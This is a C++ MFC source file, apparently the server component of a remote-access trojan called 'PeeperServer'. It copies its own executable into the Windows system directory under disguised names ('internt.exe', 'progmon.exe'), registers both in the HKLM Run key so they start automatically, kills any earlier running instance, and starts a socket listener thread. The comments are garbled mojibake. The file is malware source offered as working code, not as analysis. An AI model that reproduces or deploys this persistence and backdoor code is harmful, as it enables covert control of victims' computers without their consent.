#include "stdafx.h"
#include "PeeperServer.h"
#include "SocketThread.h"

BEGIN_MESSAGE_MAP(CPeeperServerApp, CWinApp)
	//{{AFX_MSG_MAP(CPeeperServerApp)
	//}}AFX_MSG
END_MESSAGE_MAP()

CPeeperServerApp::CPeeperServerApp()
{
}

CPeeperServerApp theApp;

BOOL CPeeperServerApp::Register()
{
	long  ret = 0;
	HKEY  hKEY;
	char  chCurPath[MAX_PATH];
	char  chSysPath[MAX_PATH];
	char  lpNewFileName1[MAX_PATH];
	char  lpNewFileName2[MAX_PATH];
	LPSTR lpCurFileName;
	DWORD dwType = REG_SZ;
	DWORD dwSize = MAX_PATH;
	LPCTSTR lpRegPath = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

	::GetSystemDirectory(chSysPath, dwSize);
	::GetModuleFileName(NULL, chCurPath, dwSize);
	
	//Copy File
	lpCurFileName = chCurPath;
	sprintf(lpNewFileName1, "%s\\internt.exe", chSysPath);
	ret = CopyFile(lpCurFileName, lpNewFileName1, FALSE);
	sprintf(lpNewFileName2, "%s\\progmon.exe", chSysPath);
	ret = CopyFile(lpCurFileName, lpNewFileName2, FALSE);
	//Open key
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRegPath, 0, KEY_WRITE, &hKEY);
	if(ret != ERROR_SUCCESS)
	{ 
		RegCloseKey(hKEY);
		return FALSE;
	}

	//Set Key
	ret = RegSetValueEx(hKEY, "Internt", NULL, dwType, 
		(const unsigned char*)lpNewFileName1, dwSize);

	ret = RegSetValueEx(hKEY, "Program file", NULL, dwType, 
		(const unsigned char*)lpNewFileName2, dwSize);

	RegCloseKey(hKEY);

	return TRUE;
}

#define PEEPER_ALONE		_T("PEEPER_ALONE_FILEMAPPING_LDF_5180")

BOOL CPeeperServerApp::InitInstance()
{
	//����ֻ��һ������������.....
	//ʹ�����ļ�ӳ��ķ���,�洢��ǰProcess ID���ڴ���,�����Ϳ���ͨ�����
	//ID���˳����������.
	HANDLE hProcessID = ::OpenFileMapping(FILE_MAP_ALL_ACCESS, TRUE, PEEPER_ALONE);
	LPBYTE lpData = NULL;
	if(hProcessID != NULL) // �Ѿ��з�����������.
	{
		lpData = (LPBYTE)::MapViewOfFile(hProcessID, 
			FILE_MAP_ALL_ACCESS, 0, 0, sizeof(DWORD));
		DWORD dwID = 0;
		if(lpData != NULL)
		{
			dwID = *((DWORD *)(lpData)); // �õ������еĽ���ID
		}
		::UnmapViewOfFile(lpData);
		::CloseHandle(hProcessID);
		if(dwID != 0) // ͨ��ID���˳�����
		{
			HANDLE hHandle = NULL;
			hHandle = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwID);
			::TerminateProcess(hHandle, 0);
			::WaitForSingleObject(hHandle, INFINITE);
			::CloseHandle(hHandle);
		}
	}
	hProcessID = ::CreateFileMapping((HANDLE)0xFFFFFFFF, NULL, PAGE_READWRITE,
		0, sizeof(DWORD), PEEPER_ALONE);
	if(hProcessID != NULL) // �����µ��ļ�ӳ��,���汾���̵�ID
	{
		lpData = (LPBYTE)::MapViewOfFile(hProcessID, 
			FILE_MAP_ALL_ACCESS, 0, 0, sizeof(DWORD));
		if(lpData != NULL)
		{
			DWORD dwID = ::GetCurrentProcessId();
			memcpy(lpData, &dwID, sizeof(DWORD));
		}
	}
	Register();
	CSocketThread *m_pSocketThread = new CSocketThread(PL_PEEPER_PORT);
	m_pSocketThread->CreateThread();
	::WaitForSingleObject(m_pSocketThread->m_hThread, INFINITE);
	::UnmapViewOfFile(lpData); // ȡ���ļ�ӳ��
	::CloseHandle(hProcessID);

	return FALSE;
}
